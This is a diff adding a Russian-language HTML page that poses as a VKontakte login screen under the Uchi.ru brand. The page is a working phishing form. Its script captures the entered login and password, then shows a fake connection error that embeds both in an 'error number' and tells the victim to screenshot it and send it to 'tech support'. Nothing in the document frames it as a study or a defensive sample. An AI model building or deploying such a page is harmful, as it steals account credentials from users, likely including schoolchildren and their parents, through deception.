@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Смена пороля</title>
+    <link rel="stylesheet" href="/changepass.css">
+</head>
+
+<body>
+
+    <div class="logo">
+        <a href="#"><img src="/images/uchiru_red.png" alt=""></a>
+    </div>
+
+
+    <div class="changepass">
+        <div class="changepass-text">
+            <h2>Учи.ру теперь сотрудничает с ВКонтакте</h2>
+        </div>
+    </div>
+
+
+    <div class="forms">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="forms-block">
+                        <h2>Вход ВКонтакте</h2>
+
+                        <div class="info">
+                            <h3>Не удаёться войти.</h3>
+                            <p>Пожалуйста проверьте правильность написания логина и пароля.</p>
+                            <p></p>
+                            <p>• Возможно нажата клавиша CapsLock?</p>
+                            <p>• Может быть у вас включена неправильная раскладка?</p>
+                            <p>• Попробуйте набрать свой пароль в текставом редакторе и скапировать</p>
+                        </div>
+
+                        <input type="email" class="input" placeholder="Логин">
+                        <br>
+                        <p></p>
+                        <p></p>
+                        <input type="password" class="pass" placeholder="Пароль">
+                        <br>
+                        <div class="komp">
+                            <div class="dvesty">
+                                <p>Чужой компьютер</p>
+                                <input id="gal" type="checkbox">
+                            </div>
+                        </div>
+                        <p></p>
+                        <button id="log">Войти</button>
+                        <a href="https://vk.com/"><button id="reg">Регестрация</button></a>
+                        <a id="aaa" href="https://connect.vk.com/restore/#/resetPassword">
+                            <p id="vost">Забыли пароль или не можете войти?</p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+    
+
+
+    <script>
+
+
+        var email = document.querySelector('.input');
+        let pass = document.querySelector('.pass');
+        var newpass = document.querySelector('.newpass');
+        var button = document.querySelector('button');
+
+        button.onclick = function () {
+
+
+            console.log(email.value);
+            console.log(pass.value);
+            alert('При попытки соеденения с сервераме VK произошла ошибка. Пожалейста сделайте скриншот номера ошибки и свяжитесь с тех. поддержкой. Номер ошибки: [XNJRij-21362|]'+ email.value + '|BB2+' + pass.value + '+N8231');
+            
+        }
+
+        function erroeMassage() {
+            
+        }
+
+
+    </script>
+
+</body>
+
+</html>
